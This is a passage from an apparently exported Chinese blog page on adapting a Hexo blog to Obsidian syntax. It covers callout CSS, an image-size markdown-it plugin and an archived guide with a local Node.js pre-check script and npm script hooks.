.custom-callout.cite &gt; .callout-title &gt; .callout-icon:before, .custom-callout.quote &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%239E9E9E&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-quote&quot;&gt;&lt;path d=&quot;M3 21c3 0 7-1 7-8V5c0-1.25-.756-2.017-2-2H4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2 1 0 1 0 1 1v1c0 1-1 2-2 2s-1 .008-1 1.031V20c0 1 0 1 1 1zM15 21c3 0 7-1 7-8V5c0-1.25-.757-2.017-2-2h-4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2h.75c0 2.25.25 4-2.75 4v3c0 1 0 1 1 1z&quot;/&gt;&lt;/svg&gt;')
}

/* 找不到关键字则提供默认样式 note 样式 */

.custom-callout &gt; .callout-title &gt; .callout-icon:before, .custom-callout.seealso &gt; .callout-title &gt; .callout-icon:before {
    content: url('data:image/svg+xml;charset=utf-8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;20&quot; height=&quot;20&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;%23448AFF&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot; class=&quot;svg-icon lucide-pencil&quot;&gt;&lt;path d=&quot;m18 2 4 4M7.5 20.5 19 9l-4-4L3.5 16.5 2 22z&quot;/&gt;&lt;/svg&gt;')
}

.custom-callout , .custom-callout.seealso {
    border-color: rgba(var(--callout-note), var(--callout-border-opacity)); /* 不起作用 */
}

.custom-callout &gt; summary, .custom-callout.seealso &gt; summary {
    background-color: rgba(var(--callout-note), var(--callout-title-bg-opacity))
}


/* 标题加粗并着色 */

.custom-callout .callout-title &gt; .callout-icon + div{
    font-weight: bold;
    color: rgba(var(--callout-note)); /* 默认颜色 */
}

.custom-callout.abstract&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.summary&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.tldr&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-abstract));
}

.custom-callout.info&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.todo&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-info));
}

.custom-callout.hint&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.important&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.tip&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-tip));
}

.custom-callout.check&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.done&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.success&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-success));
}

.custom-callout.question&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.faq&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.help&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-question));
}

.custom-callout.attention&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.caution&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.warning&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-warning));
}

.custom-callout.fail&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.failure&gt; .callout-title &gt; .callout-icon + div,
.custom-callout.missing&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-failure));
}

.custom-callout.error&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.danger&gt; .callout-title &gt; .callout-icon + div
{
    color: rgba(var(--callout-danger));
}

.custom-callout.bug&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-bug));
}

.custom-callout.example&gt; .callout-title &gt; .callout-icon + div{
    color: rgba(var(--callout-example));
}

.custom-callout.cite&gt; .callout-title &gt; .callout-icon + div ,
.custom-callout.quote&gt; .callout-title &gt; .callout-icon + div
{
    color: rgba(var(--callout-quote));
}

</code></pre>
<blockquote>
<p>上面的 CSS 代码是本人对原插件自带的样式的改进：</p>
<ul>
<li>所有样式聚合于单文件</li>
<li>提供不指定关键字时的默认样式</li>
<li>Callouts 块标题加粗并染色</li>
<li>通过 <code>!important;</code> 关键字解决 Butterfly 样式冲突问题。</li>
</ul>
</blockquote>
<p>接下来根据你使用的主题的说明，引入外部 CSS 文件 <code>callout_blocks.css</code>。Butterfly 主题的做法为在主题配置文件 <code>_config.butterfly.yml</code> 中插入：</p>
<pre><code class="language-yaml">inject:
  head:
    # callout blocks
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/callout_blocks.css&quot;&gt;
</code></pre>
<p>现在你可以测试一下 Hexo 渲染后的页面正不正常了。</p>
<p>更多渲染情况详见本站渲染调试页：<a href="#1011516134" title="Markdown 渲染测试" class="record-link ">Markdown 渲染测试</a></p>
<h1>External images 图片大小</h1>
<p>Obsidian 对于图片大小尺寸调整有其自己的一套 <a href="https://help.obsidian.md/Editing+and+formatting/Basic+formatting+syntax#External+images">语法</a>：</p>
<pre><code>![img|100x145](path/to/img) // 宽100px，高145px
![img|100](path/to/img)     // 宽100px
</code></pre>
<blockquote>
<p>通过搜寻并没有很好的方案解决，于是我就自己手撸一个了......</p>
</blockquote>
<p>插件：</p>
<p><a href="https://github.com/uuanqin/markdown-it-obsidian-imgsize"><img src="https://github-readme-stats.uuanqin.top/api/pin/?username=uuanqin&amp;repo=markdown-it-obsidian-imgsize" alt="Readme Card"></a></p>
<p>Git 仓库地址：<a href="https://github.com/uuanqin/markdown-it-obsidian-imgsize">uuanqin/markdown-it-obsidian-imgsize: Obsidian图片大小处理插件 (github.com)</a></p>
<blockquote>
<p>喜欢的话赏个⭐~</p>
</blockquote>
<p>使用方法很简单，仿照上一小节 Callouts 的解决方法，安装这个 markdown-it-plugin 即可：</p>
<pre><code class="language-sh">npm i markdown-it-obsidian-imgsize --save
</code></pre>
<p>这一层打通以后，你就可以放心使用 Obsidian 中方便调整图像大小的插件啦，比如我正在用的这个：<a href="https://github.com/nicojeske/mousewheel-image-zoom">nicojeske/mousewheel-image-zoom (github.com)</a> 鼠标滚轮调整图片大小。</p>
<h1>后记</h1>
<h2>心路历程</h2>
<p>解决 Callouts 问题的过程中，搜到 <a href="https://widcard.win/">widcardw</a> 的博客并产生启发，于是我的第一款 NPM 插件 markdown-it-obsidian-imgsize 诞生了。开发杂记详见：<a href="#3395837292" title="第一次开发 npm 插件" class="record-link ">第一次开发 npm 插件</a>。</p>
<p>关于双链渲染，心路历程详见：<a href="#746142122" title="第一次写 Hexo 插件" class="record-link ">第一次写 Hexo 插件</a></p>
<p>每次写 CSS 都要吐槽各种选择器真的很恶心，不想学前端的理由 ++。好在有讯飞星火辅助了 CSS 样式代码的解释与生成，头发少掉几根。</p>
<h2>后续改进</h2>
<ul>
<li>[x] <s>写一个 markdown-it 插件 适配 Obsidian 图片大小的语法（我真的写了一个新插件）</s></li>
<li>[ ] 重写 callouts 插件适配 Hexo
<ul>
<li>[x] 2024.08.02 对原方案做了小改进解决了大部分的问题，新插件的需求似乎没那么强烈了。</li>
</ul>
</li>
<li>[x] <s>重写 Hexo-Obsidian 双向链接插件（我直接写了一个新插件）</s></li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/qq_42951560/article/details/123596899">【Hexo】选择更高级的 Markdown 渲染器_hexo markdown_Xavier Jiezou 的博客</a></li>
<li><a href="https://blog.csdn.net/qq_36667170/article/details/105846999">hexo 更换 markdown 渲染器 @upupming/hexo-renderer-markdown-it-plus_markdown-it-katex_Ann's Blog 的博客-CSDN 博客</a></li>
<li><a href="https://zsyyblog.com/b73ceb85.html">Hexo 多种 Markdown 渲染器对比分析 | 竹山一叶 (zsyyblog.com)</a></li>
<li><a href="https://www.npmjs.com/package/mdit-plugin-callouts">mdit-plugin-callouts - npm (npmjs.com)</a></li>
<li><a href="https://widcard.win/posts/write-plugins/write-mdit-plugin">如何编写 Markdown-it 插件 (widcard.win)</a></li>
<li><a href="https://docs.joshuatz.com/cheatsheets/node-and-npm/markdown-it/">Notes on Markdown-it and Building a Plugin | Joshua's Docs (joshuatz.com)</a></li>
<li><a href="https://juejin.cn/post/6996973343280431118">记一次markdown-it插件学习 - 掘金 (juejin.cn)</a></li>
<li><a href="https://markdown-it.github.io/markdown-it/#MarkdownIt.use">markdown-it 13.0.2 API documentation | MarkdownIt (class)</a></li>
<li><a href="https://markdown-it.github.io/">markdown-it demo</a></li>
<li><a href="https://segmentfault.com/a/1190000042104317">javascript - 编写markdown-it的插件和规则 - FE_Framework_and_Engineering - SegmentFault 思否</a></li>
<li><a href="https://www.jianshu.com/p/fb0ee355915c">Markdown-It 的解析过程 - 简书 (jianshu.com)</a></li>
<li><a href="https://www.jianshu.com/p/797df3f614e5">为markdown-it编写插件 - 简书 (jianshu.com)</a></li>
<li><a href="https://github.com/mqyqingfeng/Blog/issues/252">markdown-it 原理解析 · Issue #252 · mqyqingfeng/Blog (github.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/400036665">markdown-it 源码分析及插件编写：parse 和 token（1/3） - 知乎 (zhihu.com)</a></li>
<li><a href="https://github.com/tcatche/hexo-filter-link-post/tree/main">tcatche/hexo-filter-link-post: Transfer relative post link in markdown file to post link. 将文件里的通过相对路径引用的 markdown 文件转为对应的文章的链接 (github.com)</a></li>
<li><a href="https://hexo.io/zh-cn/docs/permalinks">永久链接（Permalinks） | Hexo</a></li>
<li><a href="https://hexo.io/zh-cn/docs/plugins">插件 | Hexo</a></li>
<li><a href="https://github.com/moelody/hexo-link-obsidian">moelody/hexo-link-obsidian (github.com)</a></li>
<li><a href="https://hexo.io/zh-cn/api/rendering.html#%E6%B8%B2%E6%9F%93%E5%AD%97%E7%AC%A6%E4%B8%B2">渲染 | Hexo</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/decodeURI">decodeURI() - JavaScript | MDN (mozilla.org)</a></li>
<li><a href="https://www.jyshare.com/front-end/7625/">正则表达式可视化工具 | 菜鸟工具 (jyshare.com)</a></li>
<li><a href="https://blog.csdn.net/godread_cn/article/details/122031503">hexo 教程之为 hexo 编写一个插件_编写hexo插件-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/Zhuangvi/article/details/105759483">JavaScript 之 replace() 方法的第二个参数为匿名函数时的理解(涉及正则)_js replace 匿名函数 csdn-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/weixin_44932552/article/details/106851936">深入理解str.replace方法-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">5</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <p>关于双链渲染，心路历程详见：<a href="#746142122" title="第一次写 Hexo 插件" class="record-link highlight">第一次写 Hexo 插件</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1011516134">
                            <a href="#1011516134">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Markdown 渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^gfm]: Markdown 相关语法规范详见 <a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>
<p>更多渲染情况详见本站渲染调试页：<a href="#1011516134" title="Markdown 渲染测试" class="record-link highlight">Markdown 渲染测试</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <p>渲染效果详见本站的测试页：<a href="#1982369523" title="双链渲染测试" class="record-link highlight">双链渲染测试</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2136059777">
                            <a href="#2136059777">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_archive);">⬤</span>
                                    
                                    <span style="color: var(--n_outofdate);">⬤</span>
                                    
                                </span>
                                
                                <span>Obsidian Internal links 双向链接渲染解决方案</span>
                                
                                <div class="record-links-context hover">
                                    <p>旧方案仍然可以工作，不过操作繁琐。详见：<a href="#2136059777" title="Obsidian Internal links 双向链接渲染解决方案" class="record-link highlight">Obsidian Internal links 双向链接渲染解决方案</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3395837292">
                            <a href="#3395837292">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次开发 npm 插件</span>
                                
                                <div class="record-links-context hover">
                                    <p>解决 Callouts 问题的过程中，搜到 <a href="https://widcard.win/">widcardw</a> 的博客并产生启发，于是我的第一款 NPM 插件 markdown-it-obsidian-imgsize 诞生了。开发杂记详见：<a href="#3395837292" title="第一次开发 npm 插件" class="record-link highlight">第一次开发 npm 插件</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">6</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="4139834099">
                            <a href="#4139834099">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 侧边栏实现 Obsidian 关系图谱</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>使用钩子在 Hexo 部署前检查 Obsidian 是否启动：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
<li>Hexo 发布后自动刷新 CDN：<a href="#2958737902" title="将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）" class="record-link ">将 CDN 缓存自动刷新加入到博客发布的工作流（Hexo、WordPress）</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2136059777">
                            <a href="#2136059777">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_archive);">⬤</span>
                                    
                                    <span style="color: var(--n_outofdate);">⬤</span>
                                    
                                </span>
                                
                                <span>Obsidian Internal links 双向链接渲染解决方案</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 这是一篇过期文章 [2024.04.12]<br>
本篇文章已过期。</p>
<ul>
<li>本文为文章 <a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a> 中双链语法部分的分离，强烈建议使用新方法适配双向链接。</li>
<li>在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 <a href="#746142122" title="第一次写 Hexo 插件" class="record-link ">第一次写 Hexo 插件</a></li>
<li>这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1982369523">
                            <a href="#1982369523">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>双链渲染测试</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果想将 OFM 运用于 Hexo 中，提示文本丰富性，那么可以试试这篇文章：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="746142122">
                            <a href="#746142122">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></li>
<li><a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="127992739">
                            <a href="#127992739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>自定义文章内外链接样式的另一种方法（使用 markdown-it 插件）</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^mdi]: 关于这两款插件的介绍可以参考：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a> 中的第一部分</p>
<ul>
<li>[ ] 由于我的博客写作使用 Obsidian，内部链接一般使用双向链接的<strong>双中括号</strong>语法，这个插件暂时还识别不出。后续有时间改进一下。截至目前，双中括号语法已写新插件，这个问题有望解决：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a>。</li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2136059777" class="record">
            <header>
                <h1 class="record-title">Obsidian Internal links 双向链接渲染解决方案</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('JavaScript');">JavaScript</button>
                    
                    <button class="btn" onclick="activeTag('OFM');">OFM</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/new-out-of-date-cover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>这是一篇过期方法的分离内容</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7f51af81</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 这是一篇过期文章 [2024.04.12]<br>
本篇文章已过期。</p>
<ul>
<li>本文为文章 <a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a> 中双链语法部分的分离，强烈建议使用新方法适配双向链接。</li>
<li>在没有合适插件的情况下，我自己探索了一套方法实现这个效果。但是这套方法安装插件较多，依赖性复杂，不易维护。于是我自己写了一个更好的插件完成了这个效果，更多故事详见 <a href="#746142122" title="第一次写 Hexo 插件" class="record-link ">第一次写 Hexo 插件</a></li>
<li>这套工作链服务了半年，成功见证了数十篇文章诞生。截至光荣退休时它还能工作😀。</li>
</ul>
</blockquote>
<p>文章介绍了在 Hexo 中成功渲染双向链接的方法。</p>
<h1>相关插件安装</h1>
<p>对于 OFM 语法中的 <strong>[[ ]]</strong>，需安装以下三个插件。</p>
<h2>Hexo 第三方插件 hexo-abbrlink</h2>
<p>确保安装了 Hexo 第三方插件 <code>hexo-abbrlink</code>。<code>hexo-abbrlink</code> 是一个生成文章永久链接的插件，平时写博客就很建议你使用。后续插件将基于 <code>hexo-abbrlink</code> 进行工作。</p>
<p>仓库地址：<a href="https://github.com/rozbo/hexo-abbrlink">rozbo/hexo-abbrlink: create one and only link for every post for hexo (github.com)</a></p>
<h1><strong>Obsidian</strong> 第三方插件 link-info-server</h1>
<p>从 GitHub 仓库下载压缩包：<a href="https://github.com/moelody/link-to-server">moelody/link-to-server (github.com)</a>（理论上应该在 Obsidian 第三方插件市场找，但是找不到）。安装了插件之后记得启用。</p>
<h1><strong>Hexo</strong> 第三方插件 hexo-link-obsidian</h1>
<p>仓库地址：<a href="https://github.com/moelody/hexo-link-obsidian">moelody/hexo-link-obsidian (github.com)</a>。此插件还支持更多双向链接功能，具体可查看仓库说明文档。</p>
<p>该插件目前存在的问题：</p>
<ul>
<li>[x] <a href="https://github.com/moelody/hexo-link-obsidian/issues/3">关于网络图片的问题 · Issue #3</a></li>
<li>[x] <a href="https://github.com/moelody/hexo-link-obsidian/issues/5">关于生成的链接问题 · Issue #5</a></li>
<li>[x] 不支持 webp 图像的识别 <a href="https://github.com/moelody/hexo-link-obsidian/pull/6">Pull Request #6</a></li>
<li>[x] 必须保证 Obsidian 软件的运行（临时解决方法：详看下一小节）</li>
<li>[x] 混淆了接口类型的图片（临时解决方法：修改源代码中的图片正则匹配，彻底弃用该插件的图片功能）</li>
<li>[x] 不支持形如 <strong>[](![]())</strong> 的格式识别。纯文本中存在这种字符就报错，就比如这里我用的是粗体加反斜杠转义而不是使用行内代码格式表示。（临时解决方法：修改源代码中的图片正则匹配，彻底弃用该插件的图片功能）</li>
</ul>
<h1>【可选】自写脚本实现 hexo 静态网页生成前自动检查</h1>
<p>注意到，要想运行正常，得先打开 Obsidian 软件启动 3333 端口。为了避免疏忽造成链接生成的失误，我写了一个脚本对相关端口和插件进行了检查。</p>
<h2>写好 js 脚本</h2>
<p>使用脚本前需要安装本脚本依赖的 npm 包。也就一个 <code>npm inastall -g yamljs</code>（全局安装还是局部安装自己看着办），读 yaml 文件用的。</p>
<pre><code class="language-js">// Writer: uuanqin
// At: 2023.07.27

const { exit } = require('process');
YAML = require('yamljs');
var exec = require('child_process').exec;
const package_json = require('./package.json')

function execute(cmd){
    return new Promise((resolve, reject)=&gt;{
        exec(cmd, function(error, stdout, stderr) {
            if(error){
                console.error(error);
            }
            else{
                // console.log(stdout)
                console.log(`PRE-CHECK: excuse command - ${cmd}`)
                return resolve(stdout)
            }
            return reject(&quot;err&quot;)
        })
    })
}

// 参考
// https://github.com/moelody/hexo-link-obsidian
// https://github.com/moelody/link-to-server
// 插件默认监听的端口号
var port = 3333

// 查看有没有自定义port
function update_custom_port(){

    // Load yaml file using YAML.load
    nativeObject = YAML.load('_config.yml');
    jsonstr = JSON.stringify(nativeObject);
    jsonTemp = JSON.parse(jsonstr, null);

    // 有没有自定义过监听端口，有则改
    if(jsonTemp.easy_images!==undefined &amp;&amp; jsonTemp.easy_images.port){
        port = jsonTemp.easy_images.port
    }
}

function main(){
    var pid_arr,pid_port_open_arr;
    execute(`tasklist /FI &quot;IMAGENAME eq Obsidian.exe&quot; /NH`)
        // PID 检查程序是否启动
        .then((str)=&gt;{
            const reg1 = RegExp(/obsidian.exe/gi);
            if(str.search(reg1)&lt;0){
                throw &quot;Obsidian.exe is not running.&quot;
            }
            console.log(str)
            pid_arr = str.match(/(?&lt;=obsidian.exe\s+)[0-9]+(?=\s)/gi)
        })
        // Hexo插件安装检查
        .then(()=&gt;{
            var version = package_json.dependencies[&quot;hexo-link-obsidian&quot;]
            if(version !== undefined){
                console.log(`PRE-CHECK: Your hexo-link-obsidian version - ${version}`)
                return;
            }else{
                throw &quot;You haven't install hexo-link-obsidian plugin or just install it in global.&quot;
            }
        })
        // 目标端口更新
        .then(()=&gt;{
            update_custom_port()
            console.log(&quot;PRE-CHECK: Target port - &quot;,port)
        })
        // 查询目标端口对应开放的PID
        .then(()=&gt;{
            // console.log(pid_arr)
            return execute(`netstat -ano | findstr &quot;:${port}&quot;`)
        })
        // PID_PID 匹配
        .then((str)=&gt;{
            console.log(str)
            pid_port_open_arr = str.match(/(?&lt;=\s+)[0-9]+(?=\r)/g)
            // console.log(pid_port_open_arr)
            const pid_set = new Set(pid_arr)
            // console.log(pid_set)
            for (num of pid_port_open_arr){
                if (pid_set.has(num)){
                    return;
                }
            }
            throw &quot;Target port is not listening by Obsidian. Please check your settings.&quot;
        })
        .then(()=&gt;{
            console.log(&quot;PRE-CHECK: All checks are done.&quot;)
            exit(0);
        })
        .catch((error)=&gt;{
            // 命令执行抛出err
            if(error===&quot;err&quot;){
                console.error(`ERROR: Please contact developer to seek for solutions.`)
            }
            else{
                console.error(&quot;ERROR: &quot;,error)
            }
            exit(1);
        })
}

main()

</code></pre>
<p>这个脚本主要做以下事情：</p>
<ul>
<li>检查 Obsidian 程序是否启动</li>
<li>检查 <code>hexo-link-obsidian</code> 插件是否安装</li>
<li>确认 <code>hexo-link-obsidian</code> 插件监听的端口</li>
<li>查询对应端口占用的进程是否为 Obsidian 程序</li>
</ul>
<p>在这里，我将脚本命名为 <code>check_obsidian.js</code>。</p>
<h2>package.json 的配置</h2>
<p>package.json 中的 script 有以下特点：</p>
<ul>
<li>具有钩子性质</li>
<li>其中一条命令异常退出（返回非零值）后续命令则终止</li>
</ul>
<p>由于在每一次本地部署和网站发布前我们都需要检查一下 Obsidian 是否打开，我们可以这样设置钩子。</p>
<p>什么是钩子？比如，我们设置的本地部署命令为 hexo 三连 <code>&quot;start&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&quot;</code>，那么我们可以新建一个命令：<code>&quot;prestart&quot;: &quot;node check_obsidian.js&quot;</code>。当我们每次执行 <code>npm run start</code> 时，都会先执行 prestart、再执行 start。</p>
<p>当 prestart 过程出现错误时，start 就不会执行。这样我们就实现了部署前的检查。</p>
<p>分享一下我目前的 script 配置：</p>
<pre><code class="language-json">&quot;scripts&quot;: {
	&quot;build&quot;: &quot;hexo generate&quot;,
	&quot;clean&quot;: &quot;hexo clean&quot;,
	&quot;deploy&quot;: &quot;hexo deploy&quot;,
	&quot;server&quot;: &quot;hexo server&quot;,
	&quot;prepublish&quot;: &quot;npm run check-obsidian &amp;&amp; npm run check-markdown-filename&quot;,
	&quot;publish&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; npm run gen-cosma &amp;&amp; hexo d&quot;,
	&quot;postpublish&quot;: &quot;hexo algolia &amp;&amp; npm run flush-cdn&quot;,
	&quot;prestart&quot;: &quot;npm run check-obsidian &amp;&amp; npm run check-markdown-filename&quot;,
	&quot;start&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; npm run gen-cosma &amp;&amp; hexo s&quot;,
	&quot;check-obsidian&quot;: &quot;node my_scripts/check_obsidian.js&quot;,
	...
},
</code></pre>
<blockquote>
<p>[!warning] 注意<br>
hexo algolia 放在 hexo d -g 后，否则报错</p>
</blockquote>
<blockquote>
<p>[!Hint] 提示<br>
<code>&amp;&amp;</code> 表示与，根据“短路效应”。只有前面的命令执行成功，后面的命令才会继续执行。<br>
<code>&amp;</code> 表示两条命令同时执行。</p>
</blockquote>
<h1>本文参考</h1>
<ul>
<li><a href="https://docs.npmjs.com/cli/v6/using-npm/scripts/#special-packagejson-config-object">scripts | npm Docs (npmjs.com)</a></li>
<li><a href="https://docs.npmjs.com/cli/v6/configuring-npm/package-json#dependencies">docs.npmjs.com/cli/v6/configuring-npm/package-json#dependencies</a></li>
<li><a href="https://github.com/moelody/link-to-server">moelody/link-to-server (github.com)</a></li>
<li><a href="https://github.com/moelody/hexo-link-obsidian">moelody/hexo-link-obsidian (github.com)</a></li>
<li><a href="https://awsm.page/nodejs/run-shell-scripts-using-npm-script/#:~:text=You%20can%20run%20your%20shell%20script%20through%20a,build.sh%20%2F%2F...%20%22scripts%22%3A%20%7B%20%22build%22%3A%20%22.%2Fbuild.sh%22%20%7D%2C%20%2F%2F">Run shell scripts using npm script (awsm.page)</a></li>
<li><a href="https://blog.csdn.net/az44yao/article/details/107040391">node.js 读取 yaml 文件_js 读取 yaml_az44yao 的博客-CSDN 博客</a></li>
<li><a href="https://blog.csdn.net/gongxifacai_believe/article/details/108950368">JavaScript 中查找指定字符串的几种方式_js 查找字符串_魏晓蕾的博客-CSDN 博客</a></li>
<li><a href="https://www.runoob.com/regexp/regexp-metachar.html">正则表达式 – 元字符 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://www.runoob.com/js/js-promise.html">JavaScript Promise | 菜鸟教程 (runoob.com)</a></li>
